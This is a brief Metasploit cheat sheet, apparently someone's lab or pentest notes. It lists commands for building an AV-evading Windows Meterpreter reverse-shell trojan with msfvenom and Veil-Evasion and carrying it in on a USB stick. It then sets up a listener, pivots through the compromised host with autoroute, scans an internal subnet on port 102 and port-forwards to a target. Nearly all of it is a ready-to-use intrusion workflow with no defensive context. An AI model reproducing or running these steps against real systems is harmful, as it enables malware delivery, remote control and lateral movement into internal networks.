# Metasploit
```
Attacker 192.168.0.99
Victim   192.168.0.5
         192.168.1.5
Target   192.168.1.63
```

## Step 1: Create Windows Payload
```
msfvenom -p windows/meterpreter/reverse_tcp -f exe -e cmd/powershell_base64 -i 10 LHOST=192.168.0.99 > blabla.exe
```

## Step 2: veil-evasion
```
veil> use python/meterpreter/reverse_tcp
veil> set use_pyherion Y
veil> set LHOST 192.168.0.99
veil> generate

set filename (eg. gugus)
choose Pyinstaller (default)
cp ~/veil-output/compiled/xy.exe /media/USB
```


## Step 3: Listener 
```
msfconsole
msf> use exploit/multi/handler
msf> set payload windows/meterpreter/reverse_tcp
msf> set LHOST 192.168.0.99
msf> run
```

## Step 4: Run Trojan & Check meterpreter session
```
/* pivot, create autoroute
 *
 * - run payload on victim
 * - check msf for new meterpreter session
 */
meterpreter> run autoroute -s 192.168.1.0/24
meterpreter> run autoroute -p
```

```
/* scan session
 *
 * - leave current session
 * - run module
 */
meterpreter> background
msf> use auxiliary/scanner/portscan/tcp
msf> set PORTS 102
msf> set RHOSTS 192.168.1.0/24
msf> set THREADS 50
msf> run
```

```
/* port forward to target 
 * 
 * - go to current session CHECK ID
 * - create port forwarder localhost:102 => 192.168.1.63:102
 */
msf> sessions -l
msf> sessions -i 1
meterpreter> portfwd add -l 102 -r 192.168.1.63 -p 102
```


